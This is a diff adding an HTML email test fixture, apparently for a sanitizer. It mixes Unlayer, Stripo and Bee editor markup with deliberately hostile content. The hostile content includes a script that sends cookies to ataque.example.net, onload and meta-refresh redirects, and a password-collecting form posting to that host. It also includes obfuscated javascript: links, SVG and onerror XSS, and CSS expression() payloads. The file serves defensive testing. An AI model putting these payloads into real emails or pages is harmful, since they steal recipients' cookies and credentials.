@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<!-- Fixture "feito à mão + editores visuais (Unlayer/Stripo/Bee) + conteúdo hostil".
+     Cobre: layout em <div>/flexbox sem tabelas, classes de editor (u-row/u-col, es-wrapper/esd-block,
+     nl-container/row-content/stack), JS, eventos on*, javascript:, formulário, iframe, base href,
+     meta refresh, SVG com script, imagem em data: base64 grande, links relativos, imagem http (sem TLS),
+     CSS com expression()/url(javascript:), @import remoto, comentário condicional, AMP, Klaviyo/Unlayer merge tags,
+     entidades e caracteres invisíveis, placeholder em atributo e placeholder quebrado entre tags. -->
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="refresh" content="0;url=https://ataque.example.net/">
+<base href="https://outro-dominio.example.net/">
+<title>Promoção de primavera</title>
+<script>document.cookie && fetch('https://ataque.example.net/c?'+document.cookie);</script>
+<script type="application/ld+json">{"@context":"http://schema.org","@type":"EmailMessage","potentialAction":{"@type":"ViewAction","url":"https://exemplo-loja.example.com"}}</script>
+<link rel="stylesheet" href="https://cdn.terceiro.example.net/estilo-email.css">
+<style>
+  @import url("https://cdn.terceiro.example.net/fonte.css");
+  * { box-sizing:border-box; }
+  body { font-family: "Segoe UI", system-ui, sans-serif; background:#fff; }
+  .u-row { display:flex; gap:16px; max-width:640px; margin:0 auto; }
+  .u-col { flex:1; }
+  .es-wrapper { width:100%; background-image:url(javascript:alert(1)); }
+  .esd-block-text p { font-size:12px; color:#bbb; }
+  .stack { width:expression(document.body.clientWidth > 600 ? "600px" : "auto"); }
+  .grid { display:grid; grid-template-columns:1fr 1fr; }
+  .hero { position:absolute; top:0; left:0; }
+  .anim { animation: pulse 2s infinite; }
+  @keyframes pulse { from { opacity:1 } to { opacity:.5 } }
+  @font-face { font-family:"Marca"; src:url("https://cdn.terceiro.example.net/marca.woff2"); }
+</style>
+</head>
+<body onload="document.location='https://ataque.example.net/'" style="margin:0">
+<div class="es-wrapper nl-container" style="width:100%;">
+  <!-- cabeçalho Unlayer -->
+  <div class="u-row-container" style="padding:0">
+    <div class="u-row" style="background-color:#FFF8F0;">
+      <div class="u-col u-col-100" style="padding:24px;text-align:center;">
+        <img src="/imagens/logo.png" alt="" width="120">
+        <img src="http://imagens-sem-tls.example.org/banner-primavera.jpg" alt="Banner" style="width:100%;max-width:640px;">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==" alt="pixel embutido" width="1" height="1">
+      </div>
+    </div>
+  </div>
+
+  <!-- corpo estilo Stripo -->
+  <table class="es-content" cellspacing="0" cellpadding="0" align="center" width="100%">
+    <tr><td class="esd-stripe" align="center">
+      <table class="es-content-body" width="600" cellspacing="0" cellpadding="0" bgcolor="#ffffff" align="center">
+        <tr><td class="esd-structure es-p20" align="left">
+          <table width="100%" cellspacing="0" cellpadding="0"><tr><td class="esd-container-frame" width="560" align="center" valign="top">
+            <table width="100%" cellspacing="0" cellpadding="0">
+              <tr><td class="esd-block-text" align="left">
+                <h1 style="font-size:32px;">Oi, {{first_name|default:'amigo'}}!</h1>
+                <p>Olá {{contact.first_name}} — tag de merge do Unlayer configurada pelo cliente.</p>
+                <p>Empresa: <span>{{ </span><span>empresa }}</span> (placeholder quebrado entre tags pelo editor).</p>
+                <p>Seu nome completo: {{ nome }}. Seu e-mail: {{ email }}. Cargo: {{cargo}}.</p>
+                <p>Variável desconhecida: {{ cupom_exclusivo }} e outra com filtro: {{ nome | upcase }}.</p>
+                <p style="font-size:11px;color:#c8c8c8;">Letras miúdas: oferta válida até acabar o estoque.&nbsp;&zwnj;&#8203;</p>
+                <p><a href="javascript:alert('oi')">Clique aqui</a> ·
+                   <a href="#" onclick="steal()">Saiba mais</a> ·
+                   <a href="/promocao">Link relativo</a> ·
+                   <a href="mailto:contato@exemplo-loja.example.com?subject=Quero">Fale conosco</a> ·
+                   <a href="tel:+550000000000">Ligue</a> ·
+                   <a href="https://encurtador.example.net/aB3x">Link encurtado</a></p>
+              </td></tr>
+              <tr><td align="center" class="esd-block-button">
+                <span class="es-button-border" style="border-radius:20px;background:#ffd8c2;">
+                  <a href="https://exemplo-loja.example.com/primavera?email={{ email }}" class="es-button" target="_blank" style="font-size:13px;padding:4px 10px;color:#ffffff;background:#ffd8c2;">Ver ofertas</a>
+                </span>
+              </td></tr>
+            </table>
+          </td></tr></table>
+        </td></tr>
+      </table>
+    </td></tr>
+  </table>
+
+  <!-- duas colunas Bee (row/stack) em grid CSS -->
+  <div class="row row-2 grid">
+    <div class="column column-1 stack"><img src="https://d15k2d11r6t6rl.cloudfront.example.com/public/users/Integrators/BeeProAgency/abc/produto-a.jpg" alt="Produto A" width="300"></div>
+    <div class="column column-2 stack"><img src="https://d15k2d11r6t6rl.cloudfront.example.com/public/users/Integrators/BeeProAgency/abc/produto-b.jpg" width="300"></div>
+  </div>
+
+  <div class="hero anim">Elemento posicionado e animado</div>
+
+  <form action="https://ataque.example.net/coleta" method="post">
+    <input type="email" name="email" placeholder="Seu e-mail">
+    <input type="password" name="senha" placeholder="Sua senha">
+    <button type="submit">Confirmar</button>
+  </form>
+
+  <iframe src="https://videos.example.com/embed/abc123" width="560" height="315"></iframe>
+  <video src="https://videos.example.com/promo.mp4" controls poster="https://videos.example.com/poster.jpg"></video>
+  <object data="https://ataque.example.net/x.swf"></object>
+  <embed src="https://ataque.example.net/y.swf">
+
+  <svg width="10" height="10" onload="alert(1)"><script>alert(2)</script><circle r="5"/></svg>
+  <img src="x" onerror="alert(3)" alt="">
+  <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCg0KTwvc2NyaXB0Pg==">Abrir</a>
+  <a href="  JaVaScRiPt:alert(5)">Variação de maiúsculas</a>
+  <a href="java&#x09;script:alert(6)">Variação com entidade</a>
+
+  <!--[if mso]><table><tr><td>Só para Outlook: <script>alert(7)</script></td></tr></table><![endif]-->
+  <!-- comentário com dado sensível: token=abc123def456 -->
+
+  <amp-img src="https://exemplo-loja.example.com/amp.jpg" width="100" height="100"></amp-img>
+
+  <!-- rodapé do autor, sem link de descadastro e com descadastro "falso" -->
+  <div style="font-size:10px;color:#eeeeee;text-align:center;padding:16px;">
+    Exemplo Loja — Rua Exemplo, 300.
+    <a href="https://exemplo-loja.example.com/sair">sair da lista</a> {% unsubscribe %} {% web_view %} {{ organization.full_address }}
+  </div>
+</div>
+<img src="https://pixel.analytics-terceiro.example.net/open?id=123&amp;email={{ email }}" width="1" height="1" style="display:none" alt="">
+<img src="https://exemplo-loja.example.com/1x1.gif" width="0" height="0" alt="">
+</body>
+</html>
